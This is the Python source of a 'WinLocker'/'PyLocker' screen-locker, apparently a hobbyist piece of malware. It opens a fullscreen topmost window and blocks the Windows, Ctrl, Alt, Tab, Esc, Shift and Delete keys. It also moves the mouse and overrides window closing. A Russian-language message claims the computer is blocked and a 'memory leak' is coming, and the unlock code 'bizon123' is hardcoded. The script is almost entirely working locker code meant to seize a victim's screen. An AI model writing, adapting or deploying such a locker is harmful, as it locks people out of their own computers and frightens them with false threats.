from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import keyboard
import pyautogui
from time import sleep

USER_NAME = getpass.getuser()

pass_to_unlock = "bizon123"

window = Tk()
window.title("WinLocker by Itzkeeni")  
window.geometry('400x250')
window['bg'] = 'black'

normal_width = 1920
normal_height = 1080

screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

percentage_width = screen_width / (normal_width / 100)
percentage_height = screen_height / (normal_height / 100)

scale_factor = ((percentage_width + percentage_height) / 2) / 100

fontsize = int(20 * scale_factor)
minimum_size = 10
if fontsize < minimum_size:
       fontsize = minimum_size

fontsizeHding = int(72 * scale_factor)
minimum_size = 40
if fontsizeHding < minimum_size:
       fontsizeHding = minimum_size

default_style = ttk.Style()
default_style.configure('New.TButton', font=("Helvetica", fontsize))

def block_key():
    keyboard.block_key("win")
    keyboard.block_key("ctrl")
    keyboard.block_key("shift")
    keyboard.block_key("esc")
    keyboard.block_key("tab")
    keyboard.block_key("alt")
    keyboard.block_key("delete")

def block():
    pyautogui.moveTo(x=680,y=800)
    window.protocol("WM_DELETE_WINDOW",block)
    window.update()

def block_window():
    window.deiconify()
    
def unblock_window():
    window.withdraw()    
    
def fullscreen():
    window.attributes('-fullscreen', True, '-topmost', True)

def clicked():
    res = format(txt.get())
    if res == pass_to_unlock: #recode.check_pass()
        window.withdraw()

txt = Entry(window)

def start():
    txt_one = Label(window, text='PyLocker by ItzKeeni', font=("Arial", 50), fg='red', bg='black')
    txt_two = Label(window, text='Сорри, бро :(', font=("Arial", 30), fg='red', bg='black')
    txt_three = Label(window, text='Твой компьютер был заблокирован и скоро начнеться утечка памяти {эмодзи сигмы}', font=("Arial Bold", fontsize), fg='white', bg='black')

    txt_one.grid(column=0, row=0)
    txt_two.grid(column=0, row=0)
    txt_three.grid(column=0, row=0)

    txt_one.place(relx = .01, rely = .01)
    txt_two.place(relx = .01, rely = .11)
    txt_three.place(relx = .01, rely = .21)
    
    btn = Button(window, text="ВВОД КОДА", command=clicked)  
    txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
    btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)
    block()
    fullscreen()
    block_key()

    window.mainloop()